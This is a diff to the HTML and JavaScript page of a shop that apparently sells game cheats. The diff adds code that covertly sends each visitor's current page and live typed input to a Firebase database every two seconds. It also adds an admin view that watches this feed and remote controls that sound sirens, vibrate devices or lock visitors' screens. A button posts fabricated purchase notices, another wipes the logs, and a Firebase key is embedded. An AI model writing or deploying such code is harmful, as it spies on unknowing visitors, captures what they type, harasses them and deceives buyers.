@@ -61,8 +61,22 @@
             --price-gold: #ffcc00;
         }
 
+        @keyframes screen-glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-8px, 5px); filter: hue-rotate(90deg); }
+            40% { transform: translate(8px, -5px); filter: separation(2px); }
+            60% { transform: translate(-5px, 0); filter: invert(0.2); }
+            80% { transform: translate(5px, 5px); }
+            100% { transform: translate(0); }
+        }
+        .glitching { animation: screen-glitch 0.15s infinite; }
+        .neon-glow * { text-shadow: 0 0 15px var(--primary) !important; }
+        .neon-glow .product, .neon-glow .ui-btn, .neon-glow .panel-box { box-shadow: 0 0 15px var(--primary); }
+
         * { cursor: crosshair !important; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { margin: 0; font-family: 'Courier New', monospace; color: white; text-align: center; background: var(--bg-main); transition: 0.5s; overflow-x: hidden; padding-bottom: 80px; }
+        
+        #input-lock-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000000; background: rgba(0,0,0,0.2); cursor: not-allowed !important; pointer-events: all; }
 
         #global-alert-banner { display: none; position: fixed; top: 0; left: 0; width: 100%; background: var(--secondary); color: white; padding: 10px; z-index: 100000; font-weight: bold; border-bottom: 2px solid white; }
 
@@ -141,6 +155,7 @@
 </head>
 <body onclick="startAudio()">
 
+<div id="input-lock-overlay"></div>
 <div id="global-alert-banner"></div>
 
 <div id="loader-overlay">
@@ -247,6 +262,7 @@
             <input type="number" id="c-perc" placeholder="DISCOUNT %">
             <button onclick="addCoupon()" class="ui-btn" style="width:100%;">GENERATE</button>
         </div>
+        
         <div class="panel-box">
             <h3>⚒️ ARSENAL FORGE</h3>
             <input type="hidden" id="edit-index" value="-1">
@@ -262,16 +278,42 @@
             <button id="cancel-edit-btn" onclick="resetForge()" class="ui-btn" style="width:100%; margin-top:5px; background:gray; display:none;">CANCEL</button>
             <div id="admin-asset-list" style="max-height:100px; overflow-y:auto; margin-top:10px; border:1px solid #333; background:#000;"></div>
         </div>
+
+        <div class="panel-box" style="border-color: #ff0000;">
+            <h3 style="color:#ff0000;">💀 BEAST OVERRIDE</h3>
+            <button onclick="toggleKillSwitch()" id="kill-btn" style="width:100%; background:white; color:black; font-weight:bold; padding:10px; border:none; cursor:pointer;">ACTIVATE LOCKDOWN</button>
+            
+            <p style="font-size:10px; color:white; margin-top:15px;">TARGET CONTROL (MANUAL ID)</p>
+            <input type="text" id="manual-target-id" placeholder="Enter ID (e.g. 192)" oninput="chatTarget = this.value; document.getElementById('active-target-display').innerText = 'Target: User_' + this.value;">
+            
+            <p style="font-size:10px; color:white; margin-top:10px;">FLASH-BANG MESSAGE</p>
+            <input type="text" id="alert-msg" placeholder="Warning Message...">
+            <button onclick="sendFlashBang()" class="ui-btn" style="width:100%; background:purple; color:white;">SEND ALERT</button>
+
+            <p style="font-size:10px; color:#ff0000; margin-top:15px; border-top:1px solid #333; padding-top:5px;">VOODOO COMMANDS</p>
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:5px;">
+                <button onclick="sendPower('siren')" class="ui-btn" style="background:#ff4400; color:white;">SIREN</button>
+                <button onclick="sendPower('vibrate')" class="ui-btn" style="background:#ffcc00; color:black;">VIBRATE</button>
+                <button onclick="sendPower('lock')" class="ui-btn" style="background:red; color:white;">LOCK</button>
+                <button onclick="sendPower('unlock')" class="ui-btn" style="background:lime; color:black;">UNLOCK</button>
+            </div>
+
+            <div style="margin-top:15px; background:#111; padding:10px; border:1px solid #333; text-align:center;">
+                <span style="font-size:10px;">ACTIVE GHOSTS: </span>
+                <span id="ghost-count" style="color:lime; font-weight:bold;">0</span>
+            </div>
+            
+            <button onclick="generateFakeSale()" class="ui-btn" style="width:100%; margin-top:10px; background:orange;">INJECT FAKE SALE</button>
+            <button onclick="vacuumDatabase()" style="width:100%; margin-top:10px; background:transparent; border:1px solid red; color:red; font-size:10px; cursor:pointer;">[ WIPE ALL LOGS ]</button>
+        </div>
+
         <div class="panel-box">
             <h3 style="color:cyan;">📢 SYSTEM BROADCAST</h3>
             <input type="text" id="broadcast-input" placeholder="ALERT BANNER MESSAGE">
-            <button onclick="db.ref('settings/broadcast').set(document.getElementById('broadcast-input').value)" class="ui-btn" style="width:100%; background:cyan; color:black;">UPDATE BANNER</button>
-            <button onclick="db.ref('settings/broadcast').set('')" class="ui-btn" style="width:100%; background:#222; margin-top:5px;">CLEAR BANNER</button>
-            <h3 style="margin-top:20px; color:lime;">📊 LIVE FEED CONTROL</h3>
-            <input type="text" id="feed-label-input" placeholder="FEED LABEL">
-            <button onclick="db.ref('settings/feed_label').set(document.getElementById('feed-label-input').value)" class="ui-btn" style="width:100%; background:lime; color:black;">SET LABEL</button>
-            <textarea id="feed-text-input" placeholder="FEED CONTENT" style="height:50px; margin-top:10px;"></textarea>
-            <button onclick="db.ref('settings/feed_text').set(document.getElementById('feed-text-input').value)" class="ui-btn" style="width:100%; background:lime; color:black;">SET CONTENT</button>
+            <div style="display:flex; gap:5px;">
+                <button onclick="db.ref('settings/broadcast').set(document.getElementById('broadcast-input').value)" class="ui-btn" style="flex:2; background:cyan; color:black;">UPDATE</button>
+                <button onclick="document.getElementById('broadcast-input').value=''; db.ref('settings/broadcast').set(null)" class="ui-btn" style="flex:1; background:#333; color:white;">CLEAR</button>
+            </div>
             <h3 style="margin-top:20px; color:var(--secondary);">🛡️ SECURITY</h3>
             <input type="text" id="ban-ip-input" placeholder="IP TO BLOCK">
             <button onclick="banClientIP()" class="ui-btn" style="width:100%; background:red; color:white;">BLOCK IP</button>
@@ -281,14 +323,28 @@
     </div>
 </div>
 
-<div id="pgup-menu" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:300px; background:#000; border:3px solid var(--primary); z-index:100000; padding:20px; border-radius:10px; box-shadow:0 0 30px var(--primary); font-family:monospace;">
-    <h2 style="color:var(--primary); margin-top:0;">UI SETTINGS</h2>
-    <p style="font-size:10px;">PRIMARY THEME COLOR</p>
+<div id="pgup-menu" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:350px; background:#000; border:3px solid var(--primary); z-index:100000; padding:20px; border-radius:10px; box-shadow:0 0 30px var(--primary); font-family:monospace; max-height: 90vh; overflow-y: auto;">
+    <h2 style="color:var(--primary); margin-top:0; border-bottom: 1px solid var(--primary);">UI COMMAND CENTER</h2>
+    <p style="font-size:10px; margin-top:10px;">PRIMARY THEME COLOR</p>
     <input type="color" id="color-picker" style="width:100%; height:40px; background:transparent; border:1px solid #333;">
     <p style="font-size:10px; margin-top:15px;">SHOP TITLE</p>
-    <input type="text" id="title-input" placeholder="New Shop Name...">
-    <button onclick="applyGlobalChanges()" style="width:100%; margin-top:20px; padding:15px; background:var(--primary); color:#000; font-weight:bold; border:none; cursor:pointer;">APPLY GLOBALLY</button>
-    <button onclick="document.getElementById('pgup-menu').style.display='none'" style="width:100%; margin-top:10px; background:transparent; color:red; border:none; cursor:pointer;">[ CLOSE ]</button>
+    <input type="text" id="title-input" placeholder="New Shop Name..." style="width:100%; padding:10px; background:#111; color:#fff; border:1px solid var(--primary);">
+    <p style="font-size:10px; margin-top:15px;">MATRIX VELOCITY</p>
+    <input type="range" id="ui-matrix-speed" min="20" max="150" value="50" style="width:100%;">
+    <p style="font-size:10px; margin-top:15px;">NEON OVERDRIVE</p>
+    <select id="ui-glow" style="width:100%; padding:5px; background:#111; color:white; border:1px solid var(--primary);">
+        <option value="off">OFF</option>
+        <option value="on">ON (EXTREME)</option>
+    </select>
+    <p style="font-size:10px; margin-top:15px;">SYSTEM FONT</p>
+    <select id="ui-font" style="width:100%; padding:5px; background:#111; color:white; border:1px solid var(--primary);">
+        <option value="'Courier New', monospace">COURIER</option>
+        <option value="Arial, sans-serif">SANS</option>
+    </select>
+    <button onclick="triggerGlobalGlitch()" style="width:100%; margin-top:20px; padding:10px; background:red; color:white; font-weight:bold; border:none; cursor:pointer;">⚠️ TRIGGER SYSTEM GLITCH</button>
+    <hr style="border:0.5px solid #333; margin:20px 0;">
+    <button onclick="applyGlobalChanges()" style="width:100%; padding:15px; background:var(--primary); color:#000; font-weight:bold; border:none; cursor:pointer;">APPLY GLOBALLY</button>
+    <button onclick="document.getElementById('pgup-menu').style.display='none'" style="width:100%; margin-top:10px; background:transparent; color:gray; border:none; cursor:pointer;">[ CLOSE ]</button>
 </div>
 
 <div class="intel-ticker-wrap">
@@ -297,11 +353,13 @@
 </div>
 
 <audio id="hacker-music" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"></audio>
+<audio id="siren-sound" src="https://www.myinstants.com/media/sounds/strobe-warning.mp3"></audio>
 <audio id="snd-click" src="https://www.myinstants.com/media/sounds/sword-slash.mp3"></audio>
 
 <script>
 let products = [], cart = [], coupons = {}, isAdmin = false, discount = 0, musicStarted = false;
 let userIP = "Scanning...", userID = "Unknown", chatTarget = "NONE";
+let matrixInt;
 
 function toggleChat() { let c = document.getElementById('chat-widget'); c.style.display = (c.style.display==='flex')?'none':'flex'; }
 function closeAdmin() { document.getElementById('admin-terminal').style.display='none'; }
@@ -321,13 +379,71 @@ function syncChat() {
     db.ref(`private_chats/${room}`).off();
     db.ref(`private_chats/${room}`).on('value', s => {
         let list = s.val() ? Object.values(s.val()) : [];
-        document.getElementById('chat-msgs').innerHTML = list.map(m => `<div style="margin-bottom:5px;"><b style="color:${m.sender === "ADMIN" ? "#00ff00" : "var(--primary)"}">${m.sender}</b>: ${m.msg}</div>`).join('');
+        document.getElementById('chat-msgs').innerHTML = list.map(m => m.msg ? `<div style="margin-bottom:5px;"><b style="color:${m.sender === "ADMIN" ? "#00ff00" : "var(--primary)"}">${m.sender}</b>: ${m.msg}</div>` : '').join('');
         let div = document.getElementById('chat-msgs'); div.scrollTop = div.scrollHeight;
     });
 }
 
-function targetUser(targetID) { chatTarget = targetID; document.getElementById('active-target-display').innerText = "Target: User_" + targetID; document.getElementById('chat-title').innerText = "BRIDGE: User_" + targetID; syncChat(); if(document.getElementById('chat-widget').style.display !== 'flex') toggleChat(); }
-function resetTarget() { chatTarget = "NONE"; document.getElementById('active-target-display').innerText = "Target: User_Self"; document.getElementById('chat-title').innerText = "SECURE BRIDGE"; document.getElementById('chat-msgs').innerHTML = ""; }
+function targetUser(targetID) { 
+    chatTarget = targetID; 
+    document.getElementById('manual-target-id').value = targetID;
+    document.getElementById('active-target-display').innerText = "Target: User_" + targetID; 
+    document.getElementById('chat-title').innerText = "BRIDGE: User_" + targetID; 
+    syncChat(); 
+    if(document.getElementById('chat-widget').style.display !== 'flex') toggleChat(); 
+}
+
+// ==========================================
+// FIXED GHOST MONITOR LOGIC (DIRECT SYNC)
+// ==========================================
+function openGhostView(targetID) {
+    const gW = window.open('', '_blank', 'width=450,height=500');
+    gW.document.write(`
+        <html>
+        <head>
+            <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"><\/script>
+            <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"><\/script>
+        </head>
+        <body style="background:#050505; color:#0f0; font-family:monospace; padding:20px; overflow-x:hidden;">
+            <h2 style="color:yellow; border-bottom:1px solid #333; padding-bottom:10px;">GHOST MONITOR: User_${targetID}</h2>
+            <div id="status" style="margin-top:20px;">
+                <p>STATUS: <span id="conn-state" style="color:red;">CONNECTING...</span></p>
+                <p>CURRENT PAGE: <span id="p" style="color:white; font-weight:bold;">-</span></p>
+                <p>LAST ACTIVE: <span id="a" style="color:white;">-</span></p>
+                <div style="background:#111; padding:15px; border:1px solid #333; margin-top:20px; border-radius:5px;">
+                    <p style="color:yellow; margin:0 0 10px 0; font-size:12px; border-bottom:1px solid #222;">LIVE TYPING FEED:</p>
+                    <div id="t" style="color:white; font-size:18px; word-break: break-all; min-height:40px;">...</div>
+                </div>
+            </div>
+            <script>
+                const config = {
+                    apiKey: "AIzaSyDE6qMplWktZASB2AjUKuY_dSRCUKiZyOA",
+                    authDomain: "maxiom-r3.firebaseapp.com",
+                    databaseURL: "https://maxiom-r3-default-rtdb.firebaseio.com",
+                    projectId: "maxiom-r3"
+                };
+                firebase.initializeApp(config);
+                const gDB = firebase.database();
+                
+                gDB.ref('.info/connected').on('value', s => {
+                    if(s.val()) document.getElementById('conn-state').innerText = "ACTIVE BRIDGE";
+                });
+
+                gDB.ref('ghost_tracking/${targetID}').on('value', s => {
+                    const d = s.val();
+                    if(d) {
+                        document.getElementById('p').innerText = d.pageName || "BROWSING";
+                        document.getElementById('a').innerText = new Date(d.lastActive).toLocaleTimeString();
+                        document.getElementById('t').innerText = d.typing || "Not typing...";
+                    }
+                });
+            <\/script>
+        </body>
+        </html>
+    `);
+}
+
+function resetTarget() { chatTarget = "NONE"; document.getElementById('manual-target-id').value = ""; document.getElementById('active-target-display').innerText = "Target: User_Self"; document.getElementById('chat-title').innerText = "SECURE BRIDGE"; document.getElementById('chat-msgs').innerHTML = ""; }
 
 async function getIdentity() {
     try {
@@ -335,8 +451,36 @@ async function getIdentity() {
         const d = await r.json();
         userIP = d.ip;
         userID = userIP.split('.')[0];
-        if(!isAdmin) syncChat();
+        db.ref('presence/' + userID).set(true);
+        db.ref('presence/' + userID).onDisconnect().remove();
+        if(!isAdmin) {
+            syncChat();
+            broadcastGhostData();
+        }
     } catch(e) { console.log("Identity Error"); }
+}
+
+// ==========================================
+// FIXED GHOST BROADCASTER (HEARTBEAT)
+// ==========================================
+function broadcastGhostData() {
+    if(isAdmin || userID === "Unknown") return;
+    const isCheckout = document.getElementById('checkout-page').style.display !== 'none';
+    const isInfo = document.getElementById('info-page').style.display !== 'none';
+    let currentPage = "MAIN SHOP";
+    if(isCheckout) currentPage = "CHECKOUT PAGE";
+    if(isInfo) currentPage = "PRODUCT INFO: " + (document.getElementById('info-title').innerText || "");
+    
+    let typingContent = "";
+    if(document.activeElement && (document.activeElement.tagName === "INPUT" || document.activeElement.tagName === "TEXTAREA")) {
+        typingContent = document.activeElement.value;
+    }
+
+    db.ref(`ghost_tracking/${userID}`).update({
+        pageName: currentPage,
+        lastActive: Date.now(),
+        typing: typingContent || "Browsing..."
+    });
 }
 
 function toggleMusic(e) { 
@@ -400,12 +544,13 @@ function addToCart(i) {
     cart.push(products[i]);
     updateCartCount();
     db.ref('intel').push({ id: Date.now(), text: `VISIT | ${userIP} | ${products[i].name}`, owner: userIP.split('.')[0] });
+    broadcastGhostData();
 }
 
 function updateCartCount() { document.getElementById('cart-count').innerText = cart.length; }
 function clearCart() { cart = []; updateCartCount(); renderCart(); }
 function removeFromCart(i) { cart.splice(i, 1); updateCartCount(); renderCart(); }
-function showCheckout() { document.getElementById('shop-page').style.display='none'; document.getElementById('info-page').style.display='none'; document.getElementById('checkout-page').style.display='block'; renderCart(); }
+function showCheckout() { document.getElementById('shop-page').style.display='none'; document.getElementById('info-page').style.display='none'; document.getElementById('checkout-page').style.display='block'; renderCart(); broadcastGhostData(); }
 
 function renderCart() {
     let l=document.getElementById('cart-list'), t=0; l.innerHTML = "";
@@ -437,11 +582,19 @@ function login() {
         isAdmin = true;
         document.getElementById('admin-controls').style.display = 'grid';
         document.getElementById('login-section').style.display = 'none';
+        
         db.ref('intel').limitToLast(50).on('value', s => { 
             const val = s.val() || {};
             document.getElementById('pay-attempts-list').innerHTML = Object.keys(val).reverse().map(k => {
-                let currentOwner = val[k].owner || val[k].text.split('|')[1].trim().split('.')[0];
-                return `<div style="margin-bottom:5px; border-bottom:1px solid #333; cursor:pointer;" onclick="targetUser('${currentOwner}')">[BRIDGE] User_${currentOwner}: ${val[k].text}</div>`;
+                let txt = val[k].text || "";
+                let extID = txt.includes('|') ? txt.split('|')[1].trim().split('.')[0] : "UNK";
+                return `<div style="margin-bottom:8px; border-bottom:1px solid #333; padding-bottom:5px;">
+                            <span style="color:yellow; font-size:10px;">User_${extID}: ${txt}</span>
+                            <div style="display:flex; gap:5px; margin-top:3px;">
+                                <button onclick="targetUser('${extID}')" style="background:#0044ff; color:white; border:none; font-size:9px; padding:3px 8px; cursor:pointer; border-radius:3px;">BRIDGE</button>
+                                <button onclick="openGhostView('${extID}')" style="background:#008800; color:white; border:none; font-size:9px; padding:3px 8px; cursor:pointer; border-radius:3px;">GHOST</button>
+                            </div>
+                        </div>`;
             }).join(''); 
         });
         db.ref('coupons').on('value', s => { coupons = s.val() || {}; });
@@ -452,6 +605,37 @@ function login() {
 function banClientIP() { const ip = document.getElementById('ban-ip-input').value; if(ip) { db.ref('banned_ips').once('value', s => { let list = s.val() || []; list.push(ip); db.ref('banned_ips').set(list).then(() => alert("BLOCKED")); }); } }
 function addCoupon() { db.ref('coupons/'+document.getElementById('c-code').value.toUpperCase()).set(document.getElementById('c-perc').value).then(()=>alert("COUPON SAVED")); }
 
+function toggleKillSwitch() {
+    db.ref('settings/site_status').once('value', s => {
+        let status = s.val() === "LOCKED" ? "OPEN" : "LOCKED";
+        db.ref('settings/site_status').set(status);
+        alert("SITE STATUS: " + status);
+    });
+}
+
+function generateFakeSale() {
+    const items = ["Aimbot", "Wallhack", "Full Bundle", "iOS Bypass", "Android Root"];
+    const msg = `>>> SUCCESS: Anonymous_User_${Math.floor(Math.random()*999)} purchased [${items[Math.floor(Math.random()*items.length)]}]!`;
+    db.ref('settings/feed_text').set(msg);
+}
+
+function sendFlashBang() {
+    const msg = document.getElementById('alert-msg').value;
+    const target = chatTarget !== "NONE" ? chatTarget : document.getElementById('manual-target-id').value;
+    if(!msg || !target || target === "" || target === "NONE") return alert("NO TARGET SELECTED");
+    db.ref(`private_chats/${target}/alert`).set({ msg: msg, time: Date.now() }).then(() => alert("FLASH-BANG DEPLOYED"));
+}
+
+function sendPower(type) {
+    const target = chatTarget !== "NONE" ? chatTarget : document.getElementById('manual-target-id').value;
+    if(!target || target === "NONE") return alert("SELECT TARGET FIRST");
+    db.ref(`private_chats/${target}/power`).set({ type: type, time: Date.now() }).then(() => alert(type.toUpperCase() + " SENT"));
+}
+
+function vacuumDatabase() {
+    if(confirm("WIPE ALL LOGS?")) { db.ref('intel').set(null); db.ref('private_chats').set(null); db.ref('ghost_tracking').set(null); alert("PURIFIED"); }
+}
+
 function showInfo(i) {
     const p = products[i];
     document.getElementById('shop-page').style.display = 'none';
@@ -461,9 +645,10 @@ function showInfo(i) {
     document.getElementById('info-price').innerText = "$" + p.price;
     document.getElementById('info-desc').innerText = p.desc;
     document.getElementById('info-btns').innerHTML = `<button class="ui-btn" onclick="addToCart(${i})" style="background:var(--primary); color:black;">ADD TO CART</button>${p.yt ? `<button class="ui-btn" onclick="window.open('https://youtube.com/watch?v=${p.yt}')" style="background:red; color:white;">📺 PREVIEW</button>` : ''}`;
+    broadcastGhostData();
 }
 
-function showShop() { document.getElementById('shop-page').style.display='block'; document.getElementById('info-page').style.display='none'; document.getElementById('checkout-page').style.display='none'; }
+function showShop() { document.getElementById('shop-page').style.display='block'; document.getElementById('info-page').style.display='none'; document.getElementById('checkout-page').style.display='none'; broadcastGhostData(); }
 function applyCoupon() { const c = document.getElementById('apply-coupon').value.toUpperCase(); if(coupons[c]) { discount = coupons[c]; renderCart(); alert("APPLIED " + discount + "% DISCOUNT"); } else { alert("INVALID CODE"); } }
 
 const canvas = document.getElementById('global-canvas'); const ctx = canvas.getContext('2d'); let drops = [];
@@ -473,13 +658,50 @@ function drawMatrix() {
     drops.forEach((y, i) => { ctx.fillText(String.fromCharCode(0x30A0 + Math.random()*33), i*20, y*20); if(y*20 > canvas.height && Math.random() > 0.975) drops[i] = 0; drops[i]++; });
 }
 
+function updateMatrixSpeed(speed) { clearInterval(matrixInt); matrixInt = setInterval(drawMatrix, speed); }
+
 window.onload = () => {
     getIdentity();
     canvas.width = window.innerWidth; canvas.height = window.innerHeight;
     drops = Array(Math.floor(canvas.width/20)).fill(1);
-    setInterval(drawMatrix, 50);
+    matrixInt = setInterval(drawMatrix, 50);
     displayProducts();
     
+    db.ref('presence').on('value', s => { if(document.getElementById('ghost-count')) document.getElementById('ghost-count').innerText = s.val() ? Object.keys(s.val()).length : 0; });
+
+    db.ref('settings/site_status').on('value', s => {
+        if(s.val() === "LOCKED" && !isAdmin) {
+            document.body.innerHTML = "<h1 style='color:red; margin-top:20%'>403: SYSTEM LOCKED</h1><p>Admin is performing maintenance.</p>";
+            window.stop();
+        }
+    });
+
+    db.ref(`private_chats/${userID}/alert`).on('value', s => {
+        if(s.val()) { alert("⚠️ ADMIN: " + s.val().msg); db.ref(`private_chats/${userID}/alert`).remove(); }
+    });
+
+    db.ref(`private_chats/${userID}/power`).on('value', s => {
+        const p = s.val();
+        if(!p) return;
+        try {
+            if(p.type === 'siren') { 
+                const sfx = document.getElementById('siren-sound');
+                sfx.volume = 1.0;
+                sfx.play().catch(() => { alert("⚠️ SYNCING SECURITY BRIDGE..."); sfx.play(); }); 
+            }
+            if(p.type === 'vibrate') { if('vibrate' in navigator) navigator.vibrate([1000, 500, 1000]); }
+            if(p.type === 'lock') { 
+                document.getElementById('input-lock-overlay').style.display = 'block'; 
+                document.body.style.filter = 'grayscale(1) contrast(0.8)';
+            }
+            if(p.type === 'unlock') { 
+                document.getElementById('input-lock-overlay').style.display = 'none'; 
+                document.body.style.filter = 'none';
+            }
+        } catch(e) {}
+        setTimeout(() => db.ref(`private_chats/${userID}/power`).remove(), 2000);
+    });
+
     db.ref('settings/broadcast').on('value', s => {
         const banner = document.getElementById('global-alert-banner');
         if(s.val()) { banner.innerText = "⚠️ SYSTEM: " + s.val(); banner.style.display = 'block'; } else { banner.style.display = 'none'; }
@@ -488,26 +710,32 @@ window.onload = () => {
     db.ref('settings/feed_label').on('value', s => { document.getElementById('live-feed-label').innerText = s.val() || "LIVE_FEED"; });
     db.ref('settings/feed_text').on('value', s => { document.getElementById('feed-text').innerText = s.val() || ">>> R4 FUSION SYSTEM STABLE :: ENCRYPTION ACTIVE..."; });
 
+    db.ref('settings/glitch_signal').on('value', s => {
+        if(!s.val()) return;
+        document.body.classList.add('glitching');
+        setTimeout(() => document.body.classList.remove('glitching'), 2000);
+    });
+
     db.ref('settings/global_ui').on('value', s => {
         const data = s.val();
         if(data) {
             if(data.primary_color) document.documentElement.style.setProperty('--primary', data.primary_color);
             if(data.shop_title) document.getElementById('main-header-text').innerText = data.shop_title;
+            if(data.matrix_speed) updateMatrixSpeed(parseInt(data.matrix_speed));
+            if(data.glow_active === "on") document.body.classList.add('neon-glow'); else document.body.classList.remove('neon-glow');
+            if(data.font_choice) document.body.style.fontFamily = data.font_choice;
         }
     });
 
     window.addEventListener('keydown', (e) => {
-        // END KEY -> ADMIN TERMINAL
-        if(e.key === "End") {
-            e.preventDefault();
-            document.getElementById('admin-terminal').style.display = 'block';
-        }
-        // PAGE UP -> UI SETTINGS
-        if(e.key === "PageUp") {
-            e.preventDefault();
-            document.getElementById('pgup-menu').style.display = 'block';
-        }
+        if(e.key === "End") { e.preventDefault(); document.getElementById('admin-terminal').style.display = 'block'; }
+        if(e.key === "PageUp") { e.preventDefault(); document.getElementById('pgup-menu').style.display = 'block'; }
     });
+
+    // CRITICAL: UPDATED BROADCAST LISTENERS
+    window.addEventListener('mousedown', () => broadcastGhostData());
+    window.addEventListener('keyup', () => broadcastGhostData());
+    setInterval(broadcastGhostData, 2000); // AUTO-HEARTBEAT EVERY 2S
 
     const logs = document.getElementById('load-logs'), lines = ["> BOOTING R4...", "> SYNCING DATABASE...", "> READY."];
     let step = 0;
@@ -523,14 +751,24 @@ window.onload = () => {
     }, 600);
 };
 
+function triggerGlobalGlitch() { db.ref('settings/glitch_signal').set(Date.now()); }
+
 function applyGlobalChanges() {
-    const newColor = document.getElementById('color-picker').value;
-    const newTitle = document.getElementById('title-input').value;
-    db.ref('settings/global_ui').set({ primary_color: newColor, shop_title: newTitle })
-      .then(() => { document.getElementById('pgup-menu').style.display = 'none'; alert("GLOBAL UPDATE DEPLOYED"); });
+    const uiData = {
+        primary_color: document.getElementById('color-picker').value,
+        shop_title: document.getElementById('title-input').value,
+        matrix_speed: document.getElementById('ui-matrix-speed').value,
+        glow_active: document.getElementById('ui-glow').value,
+        font_choice: document.getElementById('ui-font').value
+    };
+    db.ref('settings/global_ui').set(uiData).then(() => {
+        document.getElementById('pgup-menu').style.display = 'none';
+        alert("GLOBAL UPDATE DEPLOYED");
+    });
 }
 
 function startAudio() { if(!musicStarted) { document.getElementById('hacker-music').play().catch(()=>{}); musicStarted = true; } }
 </script>
 </body>
 </html>
+
